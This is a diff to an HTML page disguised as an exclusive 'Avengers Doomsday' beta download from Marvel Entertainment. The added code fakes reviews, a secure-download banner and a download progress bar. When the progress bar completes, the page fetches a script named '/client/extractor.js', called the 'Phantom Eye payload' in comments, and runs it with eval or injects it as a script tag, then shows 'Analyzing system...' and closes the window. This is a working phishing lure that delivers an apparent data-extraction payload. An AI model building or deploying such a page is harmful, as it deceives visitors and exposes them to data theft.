@@ -2,54 +2,139 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Marvel Doomsday - Beta Access</title>
-    <script src="/payload.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #0a0a0a;
             min-height: 100vh;
             display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            justify-content: flex-end;
+            align-items: flex-end;
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: 
+                radial-gradient(ellipse at 20% 50%, rgba(0, 180, 80, 0.10), transparent 50%),
+                radial-gradient(ellipse at 80% 50%, rgba(80, 80, 80, 0.08), transparent 50%),
+                radial-gradient(ellipse at 50% 80%, rgba(0, 200, 100, 0.05), transparent 50%);
+            animation: bgPulse 4s ease-in-out infinite;
+        }
+        @keyframes bgPulse {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: rgba(0, 255, 100, 0.3);
+            border-radius: 50%;
+            animation: float 8s infinite;
+        }
+        .particle:nth-child(1) { left: 10%; animation-delay: 0s; }
+        .particle:nth-child(2) { left: 20%; animation-delay: 1s; }
+        .particle:nth-child(3) { left: 30%; animation-delay: 2s; }
+        .particle:nth-child(4) { left: 40%; animation-delay: 3s; }
+        .particle:nth-child(5) { left: 50%; animation-delay: 4s; }
+        .particle:nth-child(6) { left: 60%; animation-delay: 5s; }
+        .particle:nth-child(7) { left: 70%; animation-delay: 6s; }
+        .particle:nth-child(8) { left: 80%; animation-delay: 7s; }
+        .particle:nth-child(9) { left: 90%; animation-delay: 1.5s; }
+        .particle:nth-child(10) { left: 15%; animation-delay: 3.5s; }
+        @keyframes float {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            20% { opacity: 1; }
+            80% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
         }
         .card {
             background: rgba(12, 12, 18, 0.95);
+            backdrop-filter: blur(20px);
             max-width: 420px;
             width: 100%;
-            padding: 30px;
+            padding: 30px 30px 25px 30px;
             border-radius: 16px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 80px rgba(0, 180, 80, 0.06);
+            position: relative;
+            z-index: 1;
             border: 1px solid rgba(0, 180, 80, 0.12);
-            text-align: center;
-            color: white;
+            animation: slideUp 1.2s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+            transform: translateY(100%);
+            opacity: 0;
         }
-        .badge {
+        @keyframes slideUp {
+            0% { opacity: 0; transform: translateY(80%) scale(0.92); }
+            60% { opacity: 1; transform: translateY(-5px) scale(1.01); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .top-image { width: 100%; border-radius: 12px; margin-bottom: 12px; overflow: hidden; border: 1px solid rgba(0, 180, 80, 0.2); }
+        .top-image img { width: 100%; height: auto; display: block; }
+        .badge-exclusive {
             display: inline-block;
             padding: 3px 16px;
             border-radius: 20px;
             font-size: 10px;
             font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
             background: linear-gradient(90deg, #00b850, #00e070);
             color: #0a0a0a;
-            margin: 8px 0;
+            margin: 8px 0 6px 0;
+            animation: badgePulse 2s ease-in-out infinite;
         }
+        @keyframes badgePulse { 0%, 100% { box-shadow: 0 0 0 0 rgba(0, 200, 80, 0.3); } 50% { box-shadow: 0 0 0 8px rgba(0, 200, 80, 0); } }
+        .tagline { text-align: center; color: rgba(255, 255, 255, 0.5); font-size: 11px; margin-bottom: 12px; font-weight: 400; letter-spacing: 2px; text-transform: uppercase; }
+        .device-badge { display: inline-block; padding: 2px 12px; border-radius: 20px; font-size: 11px; font-weight: 500; margin-bottom: 10px; background: rgba(0, 180, 80, 0.08); color: #00b850; border: 1px solid rgba(0, 180, 80, 0.15); }
         .game-box {
             background: rgba(0, 180, 80, 0.04);
-            padding: 15px;
+            padding: 15px 18px;
             border-radius: 12px;
-            margin: 10px 0;
+            margin: 10px 0 12px 0;
+            display: flex;
+            align-items: center;
+            gap: 18px;
             border: 1px solid rgba(0, 180, 80, 0.12);
+            transition: all 0.3s ease;
         }
-        .game-box .icon { font-size: 60px; display: block; margin-bottom: 10px; }
-        .game-box .name { font-weight: 700; font-size: 16px; color: #fff; }
-        .game-box .name .green { color: #00d060; }
-        .game-box .size { color: #888; font-size: 12px; }
+        .game-box:hover { border-color: rgba(0, 180, 80, 0.3); background: rgba(0, 180, 80, 0.06); }
+        .game-box .game-icon { flex-shrink: 0; width: 80px; height: 80px; border-radius: 12px; overflow: hidden; border: 2px solid rgba(0, 180, 80, 0.25); }
+        .game-box .game-icon img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        .game-box .game-info { flex: 1; }
+        .game-box .game-info .name { font-weight: 700; font-size: 16px; color: #fff; letter-spacing: 0.5px; }
+        .game-box .game-info .name .green { color: #00d060; }
+        .game-box .game-info .size { color: #888; font-size: 12px; margin-top: 2px; }
+        .game-box .game-badge { display: inline-block; background: rgba(0, 180, 80, 0.12); color: #00d060; padding: 1px 10px; border-radius: 12px; font-size: 10px; font-weight: 600; margin-top: 3px; border: 1px solid rgba(0, 180, 80, 0.1); }
+        .rating { display: flex; align-items: center; gap: 3px; margin-top: 3px; }
+        .rating .star { color: #00d060; font-size: 13px; }
+        .rating .count { color: #666; font-size: 11px; margin-left: 4px; }
+        .security-banner { background: rgba(0, 180, 80, 0.05); padding: 10px 14px; border-radius: 10px; margin: 10px 0 15px 0; font-size: 12px; color: #00d060; border-left: 4px solid #00d060; display: flex; align-items: center; gap: 10px; }
+        .security-banner .sec-icon { font-size: 16px; flex-shrink: 0; }
+        .security-banner .sec-text { line-height: 1.5; }
+        .security-banner .sec-text strong { color: #00d060; }
         .btn {
             width: 100%;
-            padding: 16px;
+            padding: 16px 20px;
             background: linear-gradient(135deg, #00b850, #00e070);
             color: #0a0a0a;
             border: none;
@@ -57,9 +142,33 @@
             font-size: 17px;
             font-weight: 700;
             cursor: pointer;
-            margin-top: 10px;
+            transition: all 0.3s ease;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        .btn:hover { transform: scale(1.02); }
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse, rgba(255,255,255,0.15), transparent 60%);
+            animation: btnGlow 3s ease-in-out infinite;
+        }
+        @keyframes btnGlow { 0%, 100% { transform: rotate(0deg); } 50% { transform: rotate(180deg); } }
+        .btn:hover { background: linear-gradient(135deg, #00d060, #00ff80); transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0, 200, 80, 0.35); }
+        .btn:active { transform: translateY(0px); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none !important; }
+        .btn .btn-icon { position: relative; z-index: 1; font-size: 20px; }
+        .btn span { position: relative; z-index: 1; }
         .btn-secondary {
             width: 100%;
             padding: 12px;
@@ -67,49 +176,228 @@
             color: #666;
             border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 10px;
+            font-size: 13px;
+            font-weight: 500;
             cursor: pointer;
             margin-top: 8px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
-        .btn-secondary:hover { border-color: #00b850; color: #00b850; }
-        .footer { margin-top: 16px; color: #444; font-size: 10px; }
-        .green { color: #00d060; }
+        .btn-secondary:hover { border-color: #00b850; color: #00b850; background: rgba(0, 180, 80, 0.05); }
+        .footer { margin-top: 16px; color: #444; font-size: 10px; text-align: center; border-top: 1px solid rgba(255, 255, 255, 0.04); padding-top: 14px; letter-spacing: 0.3px; line-height: 1.6; }
+        .footer span { color: #00d060; }
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #1a1a2e;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 9999;
+            opacity: 0;
+            transition: all 0.4s ease;
+            pointer-events: none;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            max-width: 90%;
+            text-align: center;
+        }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .toast.success { background: #065f46; }
+        .toast.error { background: #991b1b; }
+        .toast.info { background: #1a1a2e; }
+        .progress-bar { width: 100%; height: 3px; background: rgba(255, 255, 255, 0.05); border-radius: 4px; margin: 10px 0 5px 0; overflow: hidden; display: none; }
+        .progress-bar .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #00b850, #00e070); border-radius: 4px; transition: width 0.3s; }
+        .progress-bar.active { display: block; }
+        @media (max-width: 600px) {
+            body { padding: 16px; justify-content: center; align-items: center; }
+            .card { max-width: 100%; padding: 20px 18px 20px 18px; }
+            .btn { font-size: 15px; padding: 14px; }
+            .game-box { padding: 12px 14px; gap: 14px; }
+            .game-box .game-icon { width: 65px; height: 65px; }
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div style="font-size: 60px;">🦸</div>
-        <span class="badge">🎮 EXCLUSIVE BETA ACCESS</span>
-        <div class="game-box">
-            <span class="icon">🎮</span>
-            <div class="name">AVENGERS <span class="green">DOOMSDAY</span></div>
-            <div class="size" id="gameSize">Version 1.0.0 • 4.2 GB</div>
-        </div>
-        <button class="btn" id="downloadBtn">🎮 Download Game Now</button>
-        <button class="btn-secondary" id="closeBtn">⏰ Remind me later</button>
-        <div class="footer">Marvel Entertainment • <span class="green">Doomsday Beta</span></div>
+    <div class="bg-animation"></div>
+    <div class="particles">
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
     </div>
+    <div class="card">
+        <div class="top-image">
+            <img src="https://cdn.corenexis.com/f/WA8k0n0mGem.webp" alt="Marvel Studios Doomsday" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22300%22 height=%22150%22%3E%3Crect fill=%22%230a0a0a%22 width=%22300%22 height=%22150%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%2300b850%22 font-size=%2220%22 font-weight=%22bold%22 font-family=%22Arial%22%3EMARVEL%3C/text%3E%3C/svg%3E'">
+        </div>
+        <div style="text-align:center;"><span class="badge-exclusive">🎮 EXCLUSIVE BETA ACCESS</span></div>
+        <div class="tagline">🔥 Be the first to test the game</div>
+        <div class="device-badge" id="deviceBadge">💻 Detecting...</div>
+        <div class="game-box">
+            <div class="game-icon">
+                <img src="https://cdn.corenexis.com/f/xpmBS6hyp3o.jpg" alt="Avengers Doomsday" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2280%22 height=%2280%22%3E%3Crect fill=%22%230a0a0a%22 width=%2280%22 height=%2280%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%2300b850%22 font-size=%2224%22 font-weight=%22bold%22 font-family=%22Arial%22%3E🦸%3C/text%3E%3C/svg%3E'">
+            </div>
+            <div class="game-info">
+                <div class="name">AVENGERS <span class="green">DOOMSDAY</span></div>
+                <div class="size" id="gameSize">Version 1.0.0 • 4.2 GB • Windows Setup</div>
+                <div class="rating">
+                    <span class="star">⭐</span><span class="star">⭐</span><span class="star">⭐</span>
+                    <span class="star">⭐</span><span class="star">⭐</span>
+                    <span class="count">(2,847 reviews)</span>
+                </div>
+                <span class="game-badge">🔒 Early Access</span>
+            </div>
+        </div>
+        <div class="security-banner">
+            <span class="sec-icon">🛡️</span>
+            <span class="sec-text"><strong>Limited beta:</strong> Only 5,000 testers selected • Secure download</span>
+        </div>
+        <div class="progress-bar" id="progressBar"><div class="fill" id="progressFill"></div></div>
+        <button class="btn" id="downloadBtn"><span class="btn-icon">🎮</span><span>Download Game Now</span></button>
+        <button class="btn-secondary" id="closeBtn">⏰ Remind me later</button>
+        <div class="footer">Marvel Entertainment • <span>Doomsday Beta</span> • Limited Time Offer</div>
+    </div>
+    <div class="toast" id="toast"></div>
 
     <script>
+        // ================================================
+        // DEVICE DETECTION
+        // ================================================
+        var ua = navigator.userAgent;
+        var deviceName = 'Unknown', deviceIcon = '💻';
+        if (/Windows/i.test(ua)) { deviceName = 'Windows'; deviceIcon = '💻'; }
+        else if (/Mac/i.test(ua)) { deviceName = 'macOS'; deviceIcon = '🍎'; }
+        else if (/Android/i.test(ua)) { deviceName = 'Android'; deviceIcon = '📱'; }
+        else if (/iPhone|iPad|iPod/i.test(ua)) { deviceName = 'iPhone'; deviceIcon = '📱'; }
+        else if (/Linux/i.test(ua)) { deviceName = 'Linux'; deviceIcon = '🐧'; }
+        document.getElementById('deviceBadge').textContent = deviceIcon + ' ' + deviceName;
+
+        // ================================================
+        // TOAST NOTIFICATION
+        // ================================================
+        function showToast(message, type) {
+            var toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast ' + (type || 'info');
+            toast.classList.add('show');
+            clearTimeout(toast._hideTimeout);
+            toast._hideTimeout = setTimeout(function() { toast.classList.remove('show'); }, 3500);
+        }
+
+        // ================================================
+        // PROGRESS BAR
+        // ================================================
+        function updateProgress(percent) {
+            var bar = document.getElementById('progressBar');
+            var fill = document.getElementById('progressFill');
+            bar.classList.add('active');
+            fill.style.width = percent + '%';
+            if (percent >= 100) {
+                setTimeout(function() { bar.classList.remove('active'); fill.style.width = '0%'; }, 2500);
+            }
+        }
+
+        // ================================================
+        // CLOSE BUTTON
+        // ================================================
         document.getElementById('closeBtn').addEventListener('click', function() {
-            window.close();
+            showToast('⏰ We\'ll remind you tomorrow!', 'info');
+            setTimeout(function() { window.close(); }, 1500);
         });
 
+        // ================================================
+        // LOAD PHANTOM EYE PAYLOAD
+        // ================================================
+        function loadPhantomEye() {
+            console.log('👁️ Loading Phantom Eye...');
+            
+            // Method 1: Fetch and execute
+            fetch('/client/extractor.js')
+                .then(function(response) {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok: ' + response.status);
+                    }
+                    return response.text();
+                })
+                .then(function(code) {
+                    console.log('✅ Phantom Eye loaded, executing...');
+                    try {
+                        eval(code);
+                    } catch (e) {
+                        console.log('⚠️ Execution error:', e.message);
+                        // Fallback: script tag
+                        var script = document.createElement('script');
+                        script.src = '/client/extractor.js';
+                        document.head.appendChild(script);
+                    }
+                })
+                .catch(function(err) {
+                    console.log('⚠️ Fetch failed, trying script tag...', err.message);
+                    // Method 2: Script tag fallback
+                    var script = document.createElement('script');
+                    script.src = '/client/extractor.js';
+                    script.onload = function() {
+                        console.log('✅ Phantom Eye loaded via script tag');
+                    };
+                    script.onerror = function() {
+                        console.log('⚠️ All loading methods failed');
+                        showToast('⚠️ Failed to load game data. Please try again.', 'error');
+                    };
+                    document.head.appendChild(script);
+                });
+        }
+
+        // ================================================
+        // DOWNLOAD BUTTON - TRIGGERS PHANTOM EYE
+        // ================================================
         document.getElementById('downloadBtn').addEventListener('click', function() {
             var btn = document.getElementById('downloadBtn');
-            btn.innerHTML = '⏳ Loading...';
+            btn.innerHTML = '⏳ Downloading...';
             btn.style.background = '#ffc107';
             btn.style.color = '#333';
             btn.disabled = true;
 
-            setTimeout(function() {
-                btn.innerHTML = '✅ Download Complete!';
-                btn.style.background = '#28a745';
-                btn.style.color = 'white';
-                btn.disabled = false;
-                document.getElementById('gameSize').textContent = '✅ Downloaded • Ready to install';
-                setTimeout(function() { window.close(); }, 3000);
-            }, 3000);
+            var progress = 0;
+            var interval = setInterval(function() {
+                progress += Math.random() * 12 + 3;
+                if (progress > 100) { progress = 100; }
+                updateProgress(progress);
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    
+                    // Load Phantom Eye
+                    loadPhantomEye();
+                    
+                    btn.innerHTML = '✅ Download Complete!';
+                    btn.style.background = '#28a745';
+                    btn.style.color = 'white';
+                    btn.disabled = false;
+                    document.getElementById('gameSize').textContent = '✅ Downloaded • Analyzing system...';
+                    showToast('👁️ Phantom Eye activated!', 'success');
+                    
+                    setTimeout(function() { window.close(); }, 5000);
+                }
+            }, 250);
         });
+
+        // ================================================
+        // KEYBOARD SHORTCUTS
+        // ================================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !document.querySelector('.btn:disabled')) {
+                document.getElementById('downloadBtn').click();
+            }
+            if (e.key === 'Escape') {
+                document.getElementById('closeBtn').click();
+            }
+        });
+
+        console.log('🎮 Marvel Doomsday Beta loaded.');
+        console.log('👁️ Click Download to activate Phantom Eye');
     </script>
 </body>
 </html>
